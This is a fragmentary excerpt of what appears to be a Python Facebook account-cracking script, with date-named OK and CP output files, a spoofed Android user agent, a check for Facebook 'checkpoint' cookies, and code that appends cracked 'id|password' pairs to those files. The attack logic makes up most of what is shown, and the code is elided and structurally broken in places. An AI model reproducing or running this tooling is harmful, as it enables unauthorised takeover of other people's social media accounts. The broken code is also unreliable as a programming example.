...
joker.AWM_ok = f'OK-{hari}-{bulan}-{tahun}.txt'

joker.AWM_cp = f'CP-{hari}-{bulan}-{tahun}.txt'
...
def login():
	...
	try:
		...
		link = ('https://www.facebook.com/MRSHAHIJOKER/posts/1241529463264389/?app=fbl')

		link2 = ('https://www.facebook.com/MRSHAHIJOKER/posts/131184035167935/?app=fbl')
...
def gabung():
	...
	print(f' {hh}ok di : {joker.AWM_ok}{P}\n {kk}cp di : {joker.AWM_cp}{P}')
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict():
				...
				if data in rescp:pass
					...
					if 'ya' in cepeh:
						...
						try:
							...
							open('CP/'+joker.AWM_cp,'a').write(sapi+'\n')
							...
							open('CP/'+joker.AWM_cp,'a').write(idf+'|'+pw+'\n')
				...
				if data in resok:pass
					...
					open('OK/'+joker.AWM_ok,'a').write(data+'\n')
...
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])
	...
	try:
		...
		else:open('CP/'+joker.AWM_cp,'a').write(mek+'\n')
		...
		else:open('CP/'+joker.AWM_cp,'a').write(idf+'|'+pw+'\n')
